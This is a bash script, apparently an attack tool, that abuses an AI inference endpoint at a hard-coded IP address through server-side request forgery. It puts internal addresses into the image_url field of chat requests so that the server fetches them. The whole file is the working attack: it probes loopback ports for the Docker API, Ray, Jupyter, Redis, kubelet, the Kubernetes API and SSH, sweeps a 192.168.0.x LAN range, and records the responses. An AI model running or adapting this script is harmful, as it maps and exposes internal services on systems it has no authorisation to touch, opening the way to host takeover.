#!/bin/bash
B=http://123.184.7.135:8000/invocations
p(){ curl -s -m 12 -o /tmp/w -w '%{http_code}' -X POST -H 'Content-Type: application/json' -d "{\"model\":\"m\",\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"text\",\"text\":\"hi\"},{\"type\":\"image_url\",\"image_url\":{\"url\":\"http://$1\"}}]}],\"max_tokens\":1}" "$B" > /tmp/c; echo "$(cat /tmp/c) $1 :: $(head -c 120 /tmp/w | tr -d '\n')"; }
echo "=== loopback on inference host"
for t in 127.0.0.1:2375/version 127.0.0.1:2376/version 127.0.0.1:8265/ 127.0.0.1:8888/ 127.0.0.1:9000/ 127.0.0.1:6379/ 127.0.0.1:9090/ 127.0.0.1:9400/metrics 127.0.0.1:18081/ 127.0.0.1:18080/api/health 127.0.0.1:18086/ 127.0.0.1:10250/ 127.0.0.1:6443/ 127.0.0.1:22; do p "$t"; done
echo "=== LAN sweep"
for h in 1 2 10 20 21 22 23 24 25 26 27 28 29 30 31; do
  for pt in 18086/health; do p "192.168.0.$h:$pt"; done
done
echo DONE
